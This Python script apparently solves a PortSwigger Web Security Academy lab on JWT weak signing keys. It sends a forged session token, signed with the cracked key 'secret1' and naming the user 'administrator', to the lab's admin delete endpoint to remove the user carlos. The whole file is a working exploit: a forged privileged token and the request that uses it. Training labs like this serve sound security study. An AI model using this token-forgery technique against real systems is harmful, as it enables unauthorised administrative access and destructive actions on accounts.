import requests
from bs4 import BeautifulSoup

# requirements.txt
# pip3 install bs4
# pip3 install lxml

def exploit(url,url_delete):
    # signing key = secret1
    cookie = {"Cookie":"session=eyJraWQiOiI4NDRiMzdjMy1lMjc2LTQ1ZjktYTFjOS0wYjhkNjBhYjcyYjkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTIyOTY5NzF9.TSmWGQZ6_wtO27RkhGedFbUpSP3MiKIj1_rJo_UlV98"}
    try:
        r = requests.get(url+url_delete, headers=cookie)
        print(r.status_code)
    except Exception as e:
        print(f"[ERRRO] {e}")

if __name__ == '__main__':
    url = "https://0a1f00c9048bc695820f2562001f009a.web-security-academy.net"
    url_delete = "/admin/delete?username=carlos"
    exploit(url,url_delete)

